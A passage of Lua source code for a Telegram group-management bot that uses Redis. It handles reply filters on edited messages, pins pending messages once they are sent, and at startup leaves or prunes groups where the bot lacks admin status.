local Text_Filter = redis:get(bot_id.."Tshakex:Filter:Reply2"..textedit..result.chat_id_)   
if Text_Filter then    
Delete_Message(result.chat_id_, {[0] = data.message_id_})     
Send_Options(result,result.sender_user_id_,"reply","• "..Text_Filter)  
return false
end
end
end
Dev_Bots_File(result,data) 
end,nil)
elseif data.ID == ("UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = redis:get(bot_id..'BotTshakex:Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;redis:del(bot_id..'BotTshakex:Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'BotTshakex:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'BotTshakex:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'BotTshakex:Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end

elseif data.ID == ("UpdateOption") and data.value_.value_ == ("Ready") then
local list = redis:smembers(bot_id..'Tshakex:Num:User:Pv')  
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local list = redis:smembers(bot_id..'Tshakex:ChekBotAdd') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
redis:srem(bot_id..'Tshakex:ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem(bot_id..'Tshakex:ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem(bot_id..'Tshakex:ChekBotAdd',v)  
end
if data and data.code_ and data.code_ == 400 then
redis:srem(bot_id..'Tshakex:ChekBotAdd',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
redis:sadd(bot_id..'Tshakex:ChekBotAdd',v)  
end 
end,nil)
end
end
end










